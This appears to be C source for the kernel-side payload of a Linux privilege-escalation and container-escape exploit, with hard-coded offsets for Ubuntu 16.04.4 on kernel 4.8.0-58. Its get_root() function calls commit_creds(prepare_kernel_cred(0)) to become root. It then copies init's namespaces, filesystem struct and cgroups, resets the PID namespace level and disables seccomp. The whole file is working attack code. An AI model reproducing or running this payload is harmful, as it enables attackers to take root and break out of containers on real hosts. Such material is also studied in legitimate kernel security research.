#include <linux/types.h>


// Will be overwritten if ENABLE_KASLR_BYPASS is enabled. 
// KM: This value is default for kaslr-diabled system.
unsigned long KERNEL_BASE =		0xffffffff81000000ul;

// Used to get root privileges.
/**
 * 所示KASLR部署的环境里，如果找到base地址，commit_creds和prepare_kernel_cred的偏移还是不变的
 * commit_creds(prepare_kernel_cred(0)) 在内核态注入并执行此语句通常被用于代码执行；
 * prepare_kernel_cred()创建一个新的cred，参数为0则将cred中的uid, gid设置为0，对应于root用户；
 * 随后，commit_creds()将这个cred应用于当前进程。此时，进程便提升到了root权限。
*/
#define COMMIT_CREDS			(KERNEL_BASE + kernels[kernel].commit_creds)
#define PREPARE_KERNEL_CRED		(KERNEL_BASE + kernels[kernel].prepare_kernel_cred)

// TODO: the following offset are only tested on Ubuntu 16.04.4 with kernel 4.8.0-58-generic
// copy_namespaces() can be used to do break to get the following offset (task is not optimized out)
#define TASK_REAL_PARENT_OFFSET  0x4D8
#define TASK_PID_OFFSET          0x4C8
#define TASK_FS_OFFSET           0x6B8
#define TASK_NSPROXY_OFFSET      0x6C8
#define TASK_PIDS_ARRAY_OFFSET   0x530
#define TASK_SECCOMP_OFFSET      0x740
#define TASK_STACK_OFFSET        0x8
#define TI_FLAG_OFFSET           0x8

#define TI_FLAG_INFO_LEN         4
#if(TI_FLAG_INFO_LEN == 8)
    #define TI_FLAG_INFO_TYPE unsigned long
#else
    #define TI_FLAG_INFO_TYPE unsigned int
#endif

#define COPY_FS_STRUCT           KERNEL_BASE + 0x269ad0
#define CGROUP_ATTACH_TASK_ALL   KERNEL_BASE + 0X11E240
#define PRINTK		             KERNEL_BASE + 0X19E9BE


// 
// KM: __attribute__((regparm(3))) will use three registers to pass arguments, which are eax, edx and ecx
typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_copy_fs_struct)(unsigned long init_task);
typedef int __attribute__((regparm(3))) (*_cgroup_attach_task_all)(unsigned long from, unsigned long tsk);
typedef int __attribute__((regparm(3))) (*_printk)(const char *s, ...);

#define KERN_SOH	"\001"		    /* ASCII Start Of Header */
#define KERN_ALERT	KERN_SOH "1"	/* action must be taken immediately */

enum pid_type{
	PIDTYPE_PID,
	PIDTYPE_PGID,
	PIDTYPE_SID,
	PIDTYPE_MAX
};

struct hlist_node{
	// struct hlist_node *next, **pprev;
    char* a, b;
};

struct upid {
	int nr;
	// struct pid_namespace *ns;
    char* ns;
	struct hlist_node pid_chain;
};

struct pid_link{
	struct hlist_node node;
	struct pid *pid;
};

struct pid{
	// atomic_t count;
	int count;
	unsigned int level;
	// struct hlist_head tasks[PIDTYPE_MAX];
    char* tasks[PIDTYPE_MAX];
	// struct rcu_head rcu;
    char rcu[16];
	struct upid numbers[1];
};

struct nsproxy {
    // atomic_t count;
	int count;
    // following all char* represents struct xxx_namespace *
	char* uts_ns;
    char* ipc_ns;
	char* mnt_ns;
	char* pid_ns_for_children;
	char* net_ns;
	char* cgroup_ns;
};

struct seccomp {
	int mode;
	char* filter;
};

uint64_t get_task(void) {
    uint64_t task;
    asm volatile ("movq %%gs: 0xD380, %0":"=r"(task));
    return task;
}

void get_root(void) {
    int i;
    char *task;
    char *init;
    uint32_t pid = 0;

    /* 1. Get Root and all capbilities */
	((_commit_creds)(COMMIT_CREDS))(
	    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));

    task = (char *)get_task();

    /* 2. Namespace recovery: copy namespace proxy pointer from init process */
    init = task;
    while (1) {
        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);
        pid = *(uint32_t *)(init + TASK_PID_OFFSET);
        // TODO debug:
        // {
        //     struct seccomp* sc_init = (struct seccomp*)(init + TASK_SECCOMP_OFFSET);
        //     struct pid_link* int_pids = (struct pid_link*)(init + TASK_PIDS_ARRAY_OFFSET);

        //     ((_printk)(PRINTK))(KERN_ALERT "[D] [P-%d] [L-%d] init seccomp mode - %d, init seccomp filter - %p.\n",
        //         pid, (int_pids + PIDTYPE_PID)->pid->level, sc_init->mode, sc_init->filter);
        // }

        if(pid == 1)
            break;
    }
    
    // 2.1 nsproxy copy
    *(uint64_t *)(task + TASK_NSPROXY_OFFSET) = *(uint64_t *)(init + TASK_NSPROXY_OFFSET);

    // 2.2 handle pid namespace
    /* change the level of task->pids to 0 (aka same as host processes) */
    struct pid_link* tsk_pids = (struct pid_link* )(task + TASK_PIDS_ARRAY_OFFSET);
    struct pid* p_task = (tsk_pids + PIDTYPE_PID)->pid;
    p_task->level = 0;
    // p_task = (tsk_pids + PIDTYPE_PGID)->pid;
    // p_task->level = 0;
    // p_task = (tsk_pids + PIDTYPE_SID)->pid;
    // p_task->level = 0;

    /* 3. File system recovery */
    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));

    /* 4. Cgroup recovery*/
    ((_cgroup_attach_task_all)(CGROUP_ATTACH_TASK_ALL))((unsigned long)init, (unsigned long)task);

    /* 5. seccomp bypass*/
    struct seccomp* sc_task = (struct seccomp*)(task + TASK_SECCOMP_OFFSET);
    sc_task->mode = 0;
    sc_task->filter = 0;
    char** stackp = (char**)(task + TASK_STACK_OFFSET);
    char* tip = *stackp;
    TI_FLAG_INFO_TYPE* tif = (TI_FLAG_INFO_TYPE*)(tip + TI_FLAG_OFFSET);

#define TIF_SECCOMP		8	// secure computing
#define _TIF_SECCOMP	(1 << TIF_SECCOMP)
    *tif = (*tif & ~(_TIF_SECCOMP));
}